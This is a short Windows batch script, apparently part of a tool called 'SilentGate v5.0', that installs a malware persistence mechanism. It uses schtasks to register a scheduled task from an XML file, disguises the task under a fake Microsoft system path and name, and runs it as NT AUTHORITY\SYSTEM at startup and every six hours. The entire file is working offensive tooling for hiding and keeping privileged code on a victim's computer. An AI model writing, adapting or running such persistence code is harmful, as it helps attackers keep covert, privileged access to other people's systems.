@echo off
:: SilentGate v5.0 - Persistence Installer
:: Author: JarDani
:: Uses Windows Task Scheduler for persistence

echo [PERSIST] Installing scheduled task...

:: Import task from XML
schtasks /Create /TN "Microsoft\Windows\Network\Windows Network Connectivity Maintenance" ^
    /XML "output/v5_task.xml" /F >nul

echo [PERSIST] Task registered: Windows Network Connectivity Maintenance

:: Verify task exists
schtasks /Query /TN "Microsoft\Windows\Network\Windows Network Connectivity Maintenance" >nul
if %errorlevel% equ 0 (
    echo [PERSIST] Verified - task is active
    echo [PERSIST] Trigger: system startup + every 6 hours
    echo [PERSIST] Authority: NT AUTHORITY\SYSTEM
) else (
    echo [PERSIST] Warning - task registration may have failed
)

echo [PERSIST] Complete
